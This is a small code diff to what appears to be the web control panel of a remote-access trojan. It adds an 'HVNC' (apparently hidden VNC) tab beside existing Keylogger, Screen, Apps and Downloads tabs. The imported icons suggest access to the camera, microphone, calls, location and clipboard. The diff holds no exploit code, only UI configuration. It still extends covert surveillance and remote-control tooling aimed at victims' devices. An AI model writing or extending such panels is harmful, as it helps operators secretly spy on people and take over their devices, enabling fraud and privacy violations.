@@ -1,7 +1,7 @@
 import {
   MonitorDot, Smartphone, Wrench, Settings, FileText, Users,
   Info, MessageSquare, Phone, MapPin, Camera, Mic,
-  FolderOpen, Wifi, Clipboard, Bell, Shield, Download, Server, Monitor, Keyboard,
+  FolderOpen, Wifi, Clipboard, Bell, Shield, Download, Server, Monitor, Keyboard, MonitorSmartphone,
 } from 'lucide-react';
 import type { Permission } from '@/types';
 
@@ -49,6 +49,7 @@ export const DEVICE_TABS: DeviceTabItem[] = [
   { to: 'apps', icon: Smartphone, label: 'Apps', permission: 'device:apps' },
   { to: 'fason', icon: Server, label: 'Fason', permission: 'device:fason' },
   { to: 'screen', icon: Monitor, label: 'Screen', permission: 'device:screen' },
+  { to: 'hvnc', icon: MonitorSmartphone, label: 'HVNC', permission: 'device:hvnc' },
   { to: 'keylogger', icon: Keyboard, label: 'Keylogger', permission: 'device:keylogger' },
   { to: 'downloads', icon: Download, label: 'Downloads', permission: 'files:download' },
 ];
